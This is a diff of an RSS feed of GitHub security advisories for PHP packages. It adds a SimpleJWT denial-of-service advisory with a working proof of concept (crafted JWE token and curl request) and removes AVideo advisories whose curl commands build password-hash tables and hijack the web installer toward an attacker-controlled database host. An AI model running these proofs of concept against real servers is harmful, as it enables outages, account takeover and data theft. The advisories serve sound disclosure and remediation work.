@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-03-18T20:02:06.336Z</updated>
+    <updated>2026-03-18T20:50:37.057Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,212 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[kelvinmo/simplejwt] SimpleJWT has an Unauthenticated Denial of Service via JWE header tampering]]></title>
+        <id>https://github.com/advisories/GHSA-xw36-67f8-339x</id>
+        <link href="https://github.com/advisories/GHSA-xw36-67f8-339x"/>
+        <updated>2026-03-18T20:16:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An unauthenticated attacker can perform a Denial of Service via JWE header tampering when PBES2 algorithms are used.<br>Applications that call <code>JWE::decrypt()</code> on attacker-controlled JWEs using PBES2 algorithms are affected.</p>
+<h2 id="details">Details</h2>
+<p>PHP version: <code>PHP 8.4.11</code>
+SimpleJWT version: <code>v1.1.0</code></p>
+<p>The relevant portion of the vulnerable implementation is shown below (<a href="https://github.com/kelvinmo/simplejwt/blob/edb7807a240b72c59e72d7dca31add9d16555f9f/src/SimpleJWT/Crypt/KeyManagement/PBES2.php">PBES2.php</a>):</p>
+<pre><code class="language-PHP">&lt;?php
+/* ... SNIP ... */
+class PBES2 extends BaseAlgorithm implements KeyEncryptionAlgorithm {
+    use AESKeyWrapTrait;
+
+    /** @var array&lt;string, mixed&gt; $alg_params */
+    static protected $alg_params = [
+        'PBES2-HS256+A128KW' =&gt; ['hash' =&gt; 'sha256'],
+        'PBES2-HS384+A192KW' =&gt; ['hash' =&gt; 'sha384'],
+        'PBES2-HS512+A256KW' =&gt; ['hash' =&gt; 'sha512']
+    ];
+
+    /** @var truthy-string $hash_alg */
+    protected $hash_alg;
+
+    /** @var int $iterations */
+    protected $iterations = 4096;
+    
+    /* ... SNIP ... */
+
+    /**
+     * Sets the number of iterations to use in PBKFD2 key generation.
+     *
+     * @param int $iterations number of iterations
+     * @return void
+     */
+    public function setIterations(int $iterations) {
+        $this-&gt;iterations = $iterations;
+    }
+    
+    /* ... SNIP ... */
+
+    /**
+     * {@inheritdoc}
+     */
+    public function decryptKey(string $encrypted_key, KeySet $keys, array $headers, ?string $kid = null): string {
+        /** @var SymmetricKey $key */
+        $key = $this-&gt;selectKey($keys, $kid);
+        if ($key == null) {
+            throw new CryptException('Key not found or is invalid', CryptException::KEY_NOT_FOUND_ERROR);
+        }
+        if (!isset($headers['p2s']) || !isset($headers['p2c'])) {
+            throw new CryptException('p2s or p2c headers not set', CryptException::INVALID_DATA_ERROR);
+        }
+
+        $derived_key = $this-&gt;generateKeyFromPassword($key-&gt;toBinary(), $headers);
+        return $this-&gt;unwrapKey($encrypted_key, $derived_key, $headers);
+    }
+    
+    /* ... SNIP ... */
+
+    /**
+     * @param array&lt;string, mixed&gt; $headers
+     */
+    private function generateKeyFromPassword(string $password, array $headers): string {
+        $salt = $headers['alg'] . "\x00" . Util::base64url_decode($headers['p2s']);
+        /** @var int&lt;0, max&gt; $length */
+        $length = intdiv($this-&gt;getAESKWKeySize(), 8);
+
+        return hash_pbkdf2($this-&gt;hash_alg, $password, $salt, $headers['p2c'], $length, true);
+    }
+}
+?&gt;
+</code></pre>
+<p>The security flaw lies in the lack of input validation when handling JWEs that uses PBES2.<br>A "sanity ceiling" is not set on the iteration count, which is the parameter known in the JWE specification as <code>p2c</code> (<a href="https://datatracker.ietf.org/doc/html/rfc7518#section-4.8.1.2">RFC7518</a>).<br>The library calls <code>decryptKey()</code> with the untrusted input <code>$headers</code> which then use the PHP function <code>hash_pbkdf2()</code> with the user-supplied value <code>$headers['p2c']</code>.</p>
+<p>This results in an algorithmic complexity denial-of-service (CPU exhaustion) because the PBKDF2 iteration count is fully attacker-controlled.<br>Because the header is processed before successful decryption and authentication, the attack can be triggered using an invalid JWE, meaning authentication is not required.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Spin up a simple PHP server which accepts a JWE as input and tries to decrypt the user supplied JWE.</p>
+<pre><code class="language-bash">mkdir simplejwt-poc
+cd simplejwt-poc
+composer install
+composer require kelvinmo/simplejwt
+php -S localhost:8000
+</code></pre>
+<p>The content of <code>index.php</code>:</p>
+<pre><code class="language-php">&lt;?php
+
+require __DIR__ . '/vendor/autoload.php';
+
+$set = SimpleJWT\Keys\KeySet::createFromSecret('secret123');
+
+$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$method = $_SERVER['REQUEST_METHOD'];
+
+if ($uri === '/encrypt' &amp;&amp; $method === 'GET') {
+    // Note $headers['alg'] and $headers['enc'] are required
+    $headers = ['alg' =&gt; 'PBES2-HS256+A128KW', 'enc' =&gt; 'A256CBC-HS512'];
+    $plaintext = 'This is the plaintext I want to encrypt.';
+    $jwe = new SimpleJWT\JWE($headers, $plaintext);
+
+    try {
+        echo "Encrypted JWE: " . $jwe-&gt;encrypt($set);
+    } catch (\RuntimeException $e) {
+        echo $e;
+    }
+}
+
+elseif ($uri === '/decrypt' &amp;&amp; $method === 'GET') {
+    try {
+        $jwe = $_GET['s'];
+        $jwe = SimpleJWT\JWE::decrypt($jwe, $set, 'PBES2-HS256+A128KW');
+    } catch (SimpleJWT\InvalidTokenException $e) {
+        echo $e;
+    }
+    echo $jwe-&gt;getHeader('alg') . "&lt;br&gt;";
+    echo $jwe-&gt;getHeader('enc') . "&lt;br&gt;";
+    echo $jwe-&gt;getPlaintext() . "&lt;br&gt;";
+    }
+
+else {
+    http_response_code(404);
+    echo "Route not found";
+}
+
+?&gt;
+</code></pre>
+<p>We have to craft a JWE (even unsigned and unencrypted) with this header, notice the extremely large p2c value (more than 400 billion iterations):</p>
+<pre><code class="language-json">{
+    "alg": "PBES2-HS256+A128KW",
+    "enc": "A128CBC-HS256",
+    "p2s": "blablabla",
+    "p2c": 409123223136
+}
+</code></pre>
+<p>The final JWE with poisoned header: <code>eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiYmxhYmxhYmxhIiwicDJjIjo0MDkxMjMyMjMxMzZ9.bla.bla.bla.bla</code>.</p>
+<p>Notice that only the header needs to be valid Base64URL JSON, the remaining JWE segments can contain arbitrary data.</p>
+<p>Perform the following request to the server (which tries to derive the PBES2 key):</p>
+<pre><code class="language-bash">curl --path-as-is -i -s -k -X $'GET' \
+    -H $'Host: localhost:8000' \
+    $'http://localhost:8000/decrypt?s=eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiYmxhYmxhYmxhIiwicDJjIjo0MDkxMjMyMjMxMzZ9.bla.bla.bla.bla'
+</code></pre>
+<p>The request blocks the worker until the PHP execution timeout is reached, shutting down the server:</p>
+<pre><code class="language-console">[Sun Mar 15 11:42:18 2026] PHP 8.4.11 Development Server (http://localhost:8000) started
+[Sun Mar 15 11:42:20 2026] 127.0.0.1:38532 Accepted
+
+Fatal error: Maximum execution time of 30+2 seconds exceeded (terminated) in /home/edoardottt/hack/test/simplejwt-poc/vendor/kelvinmo/simplejwt/src/SimpleJWT/Crypt/KeyManagement/PBES2.php on line 168
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker can send a crafted JWE with an extremely large <code>p2c</code> value to force the server to perform a very large number of PBKDF2 iterations.<br>This causes excessive CPU consumption during key derivation and blocks the request worker until execution limits are reached.<br>Repeated requests can exhaust server resources and make the application unavailable to legitimate users.</p>
+<h2 id="credits">Credits</h2>
+<p>Edoardo Ottavianelli (@edoardottt)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kelvinmo/simplejwt/security/advisories/GHSA-xw36-67f8-339x">https://github.com/kelvinmo/simplejwt/security/advisories/GHSA-xw36-67f8-339x</a></li>
+<li><a href="https://github.com/advisories/GHSA-xw36-67f8-339x">https://github.com/advisories/GHSA-xw36-67f8-339x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xw36-67f8-339x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-18T20:16:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[filament/tables] Filament Unvalidated Range and Values summarizer values can be used for XSS]]></title>
+        <id>https://github.com/advisories/GHSA-vv3x-j2x5-36jc</id>
+        <link href="https://github.com/advisories/GHSA-vv3x-j2x5-36jc"/>
+        <updated>2026-03-18T20:07:25.000Z</updated>
+        <content type="html"><![CDATA[<p>Two Filament Table summarizers (<code>Range</code>, <code>Values</code>) render raw database values without escaping HTML. If there is a lack of validation for the data in the columns that use these summarizers, an attacker could plant malicious HTML / JavaScript and achieve stored XSS that executes for users who view the table with those summarizers.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/filamentphp/filament/security/advisories/GHSA-vv3x-j2x5-36jc">https://github.com/filamentphp/filament/security/advisories/GHSA-vv3x-j2x5-36jc</a></li>
+<li><a href="https://github.com/advisories/GHSA-vv3x-j2x5-36jc">https://github.com/advisories/GHSA-vv3x-j2x5-36jc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vv3x-j2x5-36jc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-18T20:07:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[filament/tables] Filament Unvalidated Range and Values summarizer values can be used for XSS]]></title>
+        <id>https://github.com/advisories/GHSA-vv3x-j2x5-36jc</id>
+        <link href="https://github.com/advisories/GHSA-vv3x-j2x5-36jc"/>
+        <updated>2026-03-18T20:07:25.000Z</updated>
+        <content type="html"><![CDATA[<p>Two Filament Table summarizers (<code>Range</code>, <code>Values</code>) render raw database values without escaping HTML. If there is a lack of validation for the data in the columns that use these summarizers, an attacker could plant malicious HTML / JavaScript and achieve stored XSS that executes for users who view the table with those summarizers.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/filamentphp/filament/security/advisories/GHSA-vv3x-j2x5-36jc">https://github.com/filamentphp/filament/security/advisories/GHSA-vv3x-j2x5-36jc</a></li>
+<li><a href="https://github.com/advisories/GHSA-vv3x-j2x5-36jc">https://github.com/advisories/GHSA-vv3x-j2x5-36jc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vv3x-j2x5-36jc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-18T20:07:24.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[statamic/cms] Statamic is missing authorization check on taxonomy term creation via fieldtype]]></title>
         <id>https://github.com/advisories/GHSA-wh3h-gvc4-cc2g</id>
@@ -667,283 +873,5 @@ fetch('https://TARGET/objects/phpsessionid.json.php', {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-03-17T19:52:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[wwbn/avideo] AVideo has an Unauthenticated Password Hash Oracle via encryptPass.json.php]]></title>
-        <id>https://github.com/advisories/GHSA-px7x-gq96-rmp5</id>
-        <link href="https://github.com/advisories/GHSA-px7x-gq96-rmp5"/>
-        <updated>2026-03-17T19:50:31.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>/objects/encryptPass.json.php</code> exposes the application's password hashing algorithm to any unauthenticated user. An attacker can submit arbitrary passwords and receive their hashed equivalents, enabling offline password cracking against leaked database hashes.</p>
-<h3 id="details">Details</h3>
-<p><strong>File:</strong> <code>objects/encryptPass.json.php</code></p>
-<pre><code class="language-php">$obj-&gt;password = @$_REQUEST['pass'];
-$obj-&gt;encryptedPassword = encryptPassword($obj-&gt;password);
-echo json_encode($obj);
-</code></pre>
-<p>No authentication is required. The <code>encryptPassword()</code> function in <code>objects/functions.php</code> (line ~2101) uses:</p>
-<pre><code class="language-php">function encryptPassword($password, $noSalt = false) {
-    if (!empty($advancedCustomUser-&gt;encryptPasswordsWithSalt) &amp;&amp; !empty($global['salt']) &amp;&amp; empty($noSalt)) {
-        $password .= $global['salt'];
-    }
-    return md5(hash('whirlpool', sha1($password)));
-}
-</code></pre>
-<p>By default, salt is NOT enabled (<code>encryptPasswordsWithSalt</code> is off), making the hash deterministic and identical to what's stored in the database.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-bash"># Get the hash for any password
-curl 'https://TARGET/objects/encryptPass.json.php?pass=admin123'
-# Response: {"password":"admin123","encryptedPassword":"&lt;hash&gt;"}
-
-# Build a rainbow table for common passwords
-for pass in $(cat rockyou-top1000.txt); do
-  curl -s "https://TARGET/objects/encryptPass.json.php?pass=$pass"
-done
-</code></pre>
-<p>If an attacker obtains password hashes from the database (via SQL injection, backup exposure, etc.), they can instantly crack them by comparing against pre-computed hashes from this endpoint.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Password Cracking Acceleration</strong> — This endpoint eliminates the need for an attacker to reverse-engineer the hashing algorithm. Combined with the weak hash chain (md5+whirlpool+sha1, no salt by default), an attacker with access to database hashes can crack passwords extremely quickly.</p>
-<p>Additionally, this reveals whether salt is enabled and the exact hashing implementation, which is sensitive cryptographic configuration.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-px7x-gq96-rmp5">https://github.com/WWBN/AVideo/security/advisories/GHSA-px7x-gq96-rmp5</a></li>
-<li><a href="https://github.com/WWBN/AVideo/commit/ea2efd04464560cca93c9ab48b445dbb944a4e46">https://github.com/WWBN/AVideo/commit/ea2efd04464560cca93c9ab48b445dbb944a4e46</a></li>
-<li><a href="https://github.com/advisories/GHSA-px7x-gq96-rmp5">https://github.com/advisories/GHSA-px7x-gq96-rmp5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-px7x-gq96-rmp5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-17T19:48:35.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[wwbn/avideo] AVideo affected by unauthenticated application takeover via exposed web installer on uninitialized deployments]]></title>
-        <id>https://github.com/advisories/GHSA-2f9h-23f7-8gcx</id>
-        <link href="https://github.com/advisories/GHSA-2f9h-23f7-8gcx"/>
-        <updated>2026-03-17T19:46:41.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>install/checkConfiguration.php</code> endpoint performs full application initialization — database setup, admin account creation, and configuration file write — from unauthenticated POST input. The only guard is checking whether <code>videos/configuration.php</code> already exists. On uninitialized deployments, any remote attacker can complete the installation with attacker-controlled credentials and an attacker-controlled database, gaining full administrative access.</p>
-<h2 id="affected-component">Affected Component</h2>
-<ul>
-<li><code>install/checkConfiguration.php</code> — entire file (lines 1-273)</li>
-</ul>
-<h2 id="description">Description</h2>
-<h3 id="no-authentication-or-access-restriction-on-installer-endpoint">No authentication or access restriction on installer endpoint</h3>
-<p>The <code>checkConfiguration.php</code> file performs the most privileged operations in the application — creating the database schema, the admin account, and the configuration file — with no authentication, no setup token, no CSRF protection, and no IP restriction. The sole guard is a file-existence check:</p>
-<pre><code class="language-php">// install/checkConfiguration.php — lines 2-5
-if (file_exists("../videos/configuration.php")) {
-    error_log("Can not create configuration again: ".  json_encode($_SERVER));
-    exit;
-}
-</code></pre>
-<p>If <code>videos/configuration.php</code> does not exist (fresh deployment, container restart without persistent storage, re-deployment), the entire installer runs with attacker-controlled POST parameters.</p>
-<h3 id="attacker-controlled-database-host-eliminates-credential-guessing">Attacker-controlled database host eliminates credential guessing</h3>
-<p>Unlike typical installer exposure vulnerabilities where the attacker must guess the target's database credentials, this endpoint allows the attacker to supply their own database host:</p>
-<pre><code class="language-php">// install/checkConfiguration.php — line 25
-$mysqli = @new mysqli($_POST['databaseHost'], $_POST['databaseUser'], $_POST['databasePass'], "", $_POST['databasePort']);
-</code></pre>
-<p>The attacker can:</p>
-<ol>
-<li>Run their own MySQL server with the AVideo schema pre-loaded</li>
-<li>Set <code>databaseHost</code> to their server's IP</li>
-<li>The connection succeeds (attacker controls the DB)</li>
-<li>The configuration file is written pointing the application at the attacker's database permanently</li>
-</ol>
-<h3 id="admin-account-creation-with-unsanitized-input">Admin account creation with unsanitized input</h3>
-<p>The admin user is created with direct POST parameter concatenation into SQL:</p>
-<pre><code class="language-php">// install/checkConfiguration.php — line 120
-$sql = "INSERT INTO users (id, user, email, password, created, modified, isAdmin) VALUES (1, 'admin', '"
-     . $_POST['contactEmail'] . "', '" . md5($_POST['systemAdminPass']) . "', now(), now(), true)";
-</code></pre>
-<p>This has two issues: (1) the attacker controls the admin password, and (2) <code>$_POST['contactEmail']</code> is directly concatenated into SQL without escaping (SQL injection).</p>
-<h3 id="configuration-file-written-with-attacker-controlled-values">Configuration file written with attacker-controlled values</h3>
-<p>The configuration file is written to disk with all attacker-supplied values embedded:</p>
-<pre><code class="language-php">// install/checkConfiguration.php — lines 238-247
-$videosDir = $_POST['systemRootPath'].'videos/';
-
-if(!is_dir($videosDir)){
-    mkdir($videosDir, 0777, true);
-}
-
-$fp = fopen("{$videosDir}configuration.php", "wb");
-fwrite($fp, $content);
-fclose($fp);
-</code></pre>
-<p>The <code>$content</code> variable (built at lines 188-236) embeds <code>$_POST['databaseHost']</code>, <code>$_POST['databaseUser']</code>, <code>$_POST['databasePass']</code>, <code>$_POST['webSiteRootURL']</code>, <code>$_POST['systemRootPath']</code>, and <code>$_POST['salt']</code> directly into the PHP configuration file.</p>
-<h3 id="inconsistent-defense-cli-installer-is-protected-web-endpoint-is-not">Inconsistent defense: CLI installer is protected, web endpoint is not</h3>
-<p>The CLI installer (<code>install/install.php</code>) properly restricts access:</p>
-<pre><code class="language-php">// install/install.php — lines 3-5
-if (!isCommandLineInterface()) {
-    die('Command Line only');
-}
-</code></pre>
-<p>The web endpoint (<code>checkConfiguration.php</code>) lacks any equivalent protection, creating an inconsistent defense pattern.</p>
-<h3 id="no-web-server-protection-on-install-directory">No web server protection on install directory</h3>
-<p>There is no <code>.htaccess</code> file in the <code>install/</code> directory. The root <code>.htaccess</code> does not block access to <code>install/</code>. The endpoint is directly accessible at <code>/install/checkConfiguration.php</code>.</p>
-<h3 id="execution-chain">Execution chain</h3>
-<ol>
-<li>Attacker discovers an AVideo instance where <code>videos/configuration.php</code> does not exist (fresh or re-deployed)</li>
-<li>Attacker sends POST to <code>/install/checkConfiguration.php</code> with their own database host, admin password, and site configuration</li>
-<li>The script connects to the attacker's database (or the target's with guessed/default credentials)</li>
-<li>Tables are created, admin user is inserted with attacker's password</li>
-<li><code>configuration.php</code> is written to disk, permanently configuring the application</li>
-<li>Attacker logs in as admin with full control over the application</li>
-</ol>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p><strong>Step 1:</strong> Set up an attacker-controlled MySQL server with the AVideo schema:</p>
-<pre><code class="language-bash"># On attacker's server
-mysql -e "CREATE DATABASE avideo;"
-mysql avideo &lt; database.sql  # Use AVideo's own schema file
-</code></pre>
-<p><strong>Step 2:</strong> Send the installation request to the target:</p>
-<pre><code class="language-bash">curl -s -X POST https://TARGET/install/checkConfiguration.php \
-  -d 'systemRootPath=/var/www/html/AVideo/' \
-  -d 'databaseHost=ATTACKER_MYSQL_IP' \
-  -d 'databasePort=3306' \
-  -d 'databaseUser=attacker' \
-  -d 'databasePass=attacker_pass' \
-  -d 'databaseName=avideo' \
-  -d 'createTables=1' \
-  -d 'contactEmail=attacker@example.com' \
-  -d 'systemAdminPass=AttackerPass123!' \
-  -d 'webSiteTitle=Pwned' \
-  -d 'mainLanguage=en_US' \
-  -d 'webSiteRootURL=https://TARGET/'
-</code></pre>
-<p><strong>Step 3:</strong> Log in as admin:</p>
-<pre><code>Username: admin
-Password: AttackerPass123!
-</code></pre>
-<p>The attacker now has full administrative access. If using their own database, they control all application data.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Full application takeover:</strong> Attacker becomes the sole admin with complete control</li>
-<li><strong>Persistent backdoor via configuration:</strong> The <code>videos/configuration.php</code> file is written with attacker-controlled database credentials, ensuring persistent access even after the attack</li>
-<li><strong>Data exfiltration:</strong> If pointing to the attacker's database, all future user data (registrations, uploads, comments) flows to the attacker</li>
-<li><strong>Remote code execution potential:</strong> Admin access in AVideo enables file uploads and plugin management, which can lead to arbitrary PHP execution</li>
-<li><strong>SQL injection bonus:</strong> <code>$_POST['contactEmail']</code> on line 120 is directly concatenated into SQL, allowing additional database manipulation</li>
-</ul>
-<h2 id="recommended-remediation">Recommended Remediation</h2>
-<h3 id="option-1-add-a-one-time-setup-token-preferred">Option 1: Add a one-time setup token (preferred)</h3>
-<p>Generate a random setup token during deployment that must be provided to complete installation:</p>
-<pre><code class="language-php">// At the top of install/checkConfiguration.php, after the file_exists check:
-
-// Require a setup token that was generated during deployment
-$setupTokenFile = __DIR__ . '/../videos/.setup_token';
-if (!file_exists($setupTokenFile)) {
-    $obj = new stdClass();
-    $obj-&gt;error = "Setup token file not found. Create videos/.setup_token with a random secret.";
-    header('Content-Type: application/json');
-    echo json_encode($obj);
-    exit;
-}
-
-$expectedToken = trim(file_get_contents($setupTokenFile));
-if (empty($_POST['setupToken']) || !hash_equals($expectedToken, $_POST['setupToken'])) {
-    $obj = new stdClass();
-    $obj-&gt;error = "Invalid setup token.";
-    header('Content-Type: application/json');
-    echo json_encode($obj);
-    exit;
-}
-</code></pre>
-<h3 id="option-2-restrict-installer-to-localhostcli-only">Option 2: Restrict installer to localhost/CLI only</h3>
-<p>Block web access to the installer entirely:</p>
-<pre><code class="language-php">// At the top of install/checkConfiguration.php, after the file_exists check:
-if (!isCommandLineInterface()) {
-    $allowedIPs = ['127.0.0.1', '::1'];
-    if (!in_array($_SERVER['REMOTE_ADDR'], $allowedIPs)) {
-        header('Content-Type: application/json');
-        echo json_encode(['error' =&gt; 'Installation is only allowed from localhost']);
-        exit;
-    }
-}
-</code></pre>
-<p>Additionally, add an <code>.htaccess</code> file in the <code>install/</code> directory:</p>
-<pre><code class="language-apache"># install/.htaccess
-&lt;Files "checkConfiguration.php"&gt;
-    Require local
-&lt;/Files&gt;
-</code></pre>
-<h3 id="additional-fixes-needed">Additional fixes needed</h3>
-<ol>
-<li><strong>Parameterize SQL queries</strong> on line 120 to prevent SQL injection:</li>
-</ol>
-<pre><code class="language-php">$stmt = $mysqli-&gt;prepare("INSERT INTO users (id, user, email, password, created, modified, isAdmin) VALUES (1, 'admin', ?, ?, now(), now(), true)");
-$hashedPass = md5($_POST['systemAdminPass']); // Also: upgrade from md5 to password_hash()
-$stmt-&gt;bind_param("ss", $_POST['contactEmail'], $hashedPass);
-$stmt-&gt;execute();
-</code></pre>
-<ol start="2">
-<li><strong>Upgrade password hashing</strong> from <code>md5()</code> to <code>password_hash()</code> with <code>PASSWORD_BCRYPT</code> or <code>PASSWORD_ARGON2ID</code>.</li>
-</ol>
-<h2 id="credit">Credit</h2>
-<p>This vulnerability was discovered and reported by <a href="https://bugbunny.ai">bugbunny.ai</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-2f9h-23f7-8gcx">https://github.com/WWBN/AVideo/security/advisories/GHSA-2f9h-23f7-8gcx</a></li>
-<li><a href="https://github.com/WWBN/AVideo/commit/b3fa7869dcb935c8ab5c001a88dc29d2f92cf8e1">https://github.com/WWBN/AVideo/commit/b3fa7869dcb935c8ab5c001a88dc29d2f92cf8e1</a></li>
-<li><a href="https://github.com/advisories/GHSA-2f9h-23f7-8gcx">https://github.com/advisories/GHSA-2f9h-23f7-8gcx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2f9h-23f7-8gcx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-17T19:46:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[cockpit-hq/cockpit] Cockpit CMS has SQL Injection in MongoLite Aggregation Optimizer via toJsonExtractRaw() ]]></title>
-        <id>https://github.com/advisories/GHSA-7x5c-vfhj-9628</id>
-        <link href="https://github.com/advisories/GHSA-7x5c-vfhj-9628"/>
-        <updated>2026-03-17T17:07:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>This is a SQL Injection vulnerability in the MongoLite Aggregation Optimizer.</p>
-<p>Any Cockpit CMS instance running version <strong>2.13.4 or earlier</strong> with API access enabled
-is potentially affected.</p>
-<p><strong>Who is impacted:</strong></p>
-<ul>
-<li>Any deployment where the <code>/api/content/aggregate/{model}</code> endpoint is publicly
-accessible or reachable by untrusted users.</li>
-<li>Attackers in possession of a <strong>valid read-only API key</strong> (the lowest privilege level)
-can exploit this vulnerability — no admin access is required.</li>
-</ul>
-<p><strong>What an attacker can do:</strong></p>
-<ul>
-<li>Inject arbitrary SQL via unsanitized field names in aggregation queries.</li>
-<li>Bypass the <code>_state=1</code> published-content filter to access unpublished or restricted content.</li>
-<li>Extract unauthorized data from the underlying SQLite content database.</li>
-</ul>
-<p><strong>Confidentiality impact is High.</strong> Integrity and availability are not directly affected
-by this vulnerability.</p>
-<h3 id="patches">Patches</h3>
-<p>This vulnerability has been <strong>patched in version 2.13.5</strong>.</p>
-<p>All users running Cockpit CMS version <strong>2.13.4 or earlier</strong> are strongly advised to
-upgrade to <strong>2.13.5 or later</strong> immediately.</p>
-<ul>
-<li><a href="https://github.com/Cockpit-HQ/Cockpit/releases/tag/2.13.5">https://github.com/Cockpit-HQ/Cockpit/releases/tag/2.13.5</a></li>
-</ul>
-<p>The fix applies the same field-name sanitization introduced in v2.13.3 for <code>toJsonPath()</code>
-to the <code>toJsonExtractRaw()</code> method in <code>lib/MongoLite/Aggregation/Optimizer.php</code>,
-closing the injection vector in the Aggregation Optimizer.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Cockpit-HQ/Cockpit/security/advisories/GHSA-7x5c-vfhj-9628">https://github.com/Cockpit-HQ/Cockpit/security/advisories/GHSA-7x5c-vfhj-9628</a></li>
-<li><a href="https://github.com/Cockpit-HQ/Cockpit/releases/tag/2.13.5">https://github.com/Cockpit-HQ/Cockpit/releases/tag/2.13.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-7x5c-vfhj-9628">https://github.com/advisories/GHSA-7x5c-vfhj-9628</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7x5c-vfhj-9628</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-17T17:07:41.000Z</published>
     </entry>
 </feed>
